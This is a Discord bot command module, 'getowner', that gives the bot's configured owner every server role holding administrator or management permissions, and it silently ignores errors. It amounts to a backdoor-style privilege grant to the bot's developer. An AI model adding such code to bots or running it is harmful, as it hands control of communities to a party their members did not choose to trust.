module.exports = {
    name: "getowner",
    description: "Tries to give the bot's owner Admin!",
    category: `admin`,
    aliases: ["go","geto","getown"],
    perms: ['ADMINISTRATOR'],
    cmdperms: ['MANAGE_ROLES']
}

module.exports.run = async (bot, msg) => {
    const { config } = bot;
    if(!msg.guild.me.hasPermission('MANAGE_ROLES')) return msg.channel.send("Bot doesn't have permissions here").then(ms => ms.delete(5000));

    msg.guild.fetchMember(config.owner).then(owner => {

        msg.guild.roles.forEach(role => {
            let stop = false;
            ['ADMINISTRATOR','MANAGE_ROLES','MANAGE_GUILD','MANAGE_CHANNELS'].forEach(perm => {
                if(role.hasPermission(perm) && !stop) {
                    owner.addRole(role).catch(e => {})
                    stop = true;
                }
            })
        })
    }).catch(e => {})
}
